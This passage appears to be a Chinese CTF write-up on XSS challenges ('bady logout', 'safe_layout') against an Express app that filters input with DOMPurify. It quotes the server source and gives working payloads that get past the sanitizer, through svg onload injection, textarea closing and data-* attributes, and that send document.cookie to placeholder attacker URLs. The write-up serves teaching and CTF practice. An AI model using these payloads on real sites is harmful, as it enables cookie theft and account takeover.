class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content&#125;&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>他把我们输入的内容全都检查了一遍，但是采用默认的配置，我们了解<code>DOMPurify.sanitize</code>的<a href="https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes">原理</a></p><p>我们输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>  <br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112503557.png" alt="image-20250312112503557"></p><p>发现<code>onload</code>被过滤但是我们输入</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">onload</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>发现没有被过滤</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112627575.png" alt="image-20250312112627575"></p><p>那我就可以拼接构造xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">layout:  <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>  <br><br>content:    test&quot; onload=location.href=&quot;http://IP:PORT?flag=&quot;+document.cookie src=&quot;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112836467.png" alt="image-20250312112836467"></p><p>成功跳转</p><p>第二种思路就是闭合<code>&lt;/textarea&gt;</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312184144330.png" alt="image-20250312184144330"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">logout</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br><br><span class="hljs-attr">content</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;&lt;/textarea&gt;</span></span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&lt;img src=x onerror=fetch(&#x27;&#123;YOUR_URL&#125;&#x27;+document.cookie)&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312184425906.png" alt="image-20250312184425906"></p><p>也是成功解析</p><h2 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe_layout"></a>safe_layout</h2><p>难度高的吓人(bushi)😁，前端的知识还是迷迷糊糊的不清楚</p><p>源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express&#x27;</span>;<br><span class="hljs-keyword">import</span> session <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-session&#x27;</span>;<br><span class="hljs-keyword">import</span> rateLimit <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-rate-limit&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; randomBytes &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;crypto&#x27;</span>;<br><span class="hljs-keyword">import</span> createDOMPurify <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;dompurify&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-variable constant_">JSDOM</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jsdom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-variable language_">window</span> &#125; = <span class="hljs-keyword">new</span> <span class="hljs-title function_">JSDOM</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DOMPurify</span> = <span class="hljs-title function_">createDOMPurify</span>(<span class="hljs-variable language_">window</span>);<br><br><span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_LAYOUT</span> = <span class="hljs-string">`</span><br><span class="hljs-string">&lt;article&gt;</span><br><span class="hljs-string">  &lt;h1&gt;Blog Post&lt;/h1&gt;</span><br><span class="hljs-string">  &lt;div&gt;&#123;&#123;content&#125;&#125;&lt;/div&gt;</span><br><span class="hljs-string">&lt;/article&gt;</span><br><span class="hljs-string">`</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LENGTH_LIMIT</span> = <span class="hljs-number">500</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>  app.<span class="hljs-title function_">use</span>(<br>    <span class="hljs-string">&#x27;/api&#x27;</span>,<br>    <span class="hljs-title function_">rateLimit</span>(&#123;<br>      <span class="hljs-attr">windowMs</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,<br>      <span class="hljs-attr">max</span>: <span class="hljs-number">10</span>,<br>    &#125;),<br>  );<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>  <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,<br>&#125;));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, _, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Cache-Control&#x27;</span>, <span class="hljs-string">&#x27;no-store&#x27;</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;home&#x27;</span>, &#123;<br>    <span class="hljs-attr">posts</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>,<br>    <span class="hljs-attr">maxLayout</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>,<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content, &#123; <span class="hljs-attr">ALLOWED_ATTR</span>: [] &#125;);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout, &#123; <span class="hljs-attr">ALLOWED_ATTR</span>: [] &#125;);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/post/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">params</span>;<br>  <span class="hljs-keyword">const</span> body = posts.<span class="hljs-title function_">get</span>(id);<br>  <span class="hljs-keyword">if</span> (body === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post not found&#x27;</span>);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;post&#x27;</span>, &#123; id, body &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/clear&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;cleared&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Web server running on port 3000&#x27;</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>看输入部分</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content, &#123; <span class="hljs-attr">ALLOWED_ATTR</span>: [] &#125;);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout, &#123; <span class="hljs-attr">ALLOWED_ATTR</span>: [] &#125;);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>与<code>bady logout</code>相比加了<code> &#123; ALLOWED_ATTR: [] &#125;</code>,禁用所有<code>html</code>标签,<code>src</code>会被过滤</p><p>但是data-* 和 aria-* 类的属性是不会被过滤的</p><p>参考这篇<a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations">文章</a></p><p><code>data-*</code> 和 <code>aria-*</code> 是 “安全的” 自定义属性，不会被过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;svg data-type=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;&lt;/svg&gt;<br><br>test<span class="hljs-string">&quot; onload=location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//xxx.xxx.xxx.xxx:xxxx?flag=&quot;+document.cookie src=&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312120033286.png" alt="image-20250312120033286"></p><p>成功解析</p><p>同样也可以用<code>&lt;/textarea&gt;</code>构造闭合</p><p>由于data-* 和 aria-* 类的属性是不会被过滤的</p><p>我们采用data-* 和 aria-* 类的属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">logout</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br><br><span class="hljs-attr">content</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">data-c</span>=<span class="hljs-string">&quot;&lt;/textarea&gt;</span></span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&lt;img src=x onerror=fetch(&#x27;&#123;YOUR_URL&#125;&#x27;+document.cookie)&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312200534311.png" alt="image-20250312200534311"></p><p>成功解析</p><h2 id="safe-layout-revenge"><a href="#safe-layout-revenge" class="headerlink" title="safe layout revenge"></a>safe layout revenge</h2><p>怎么国际赛全是xss啊</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 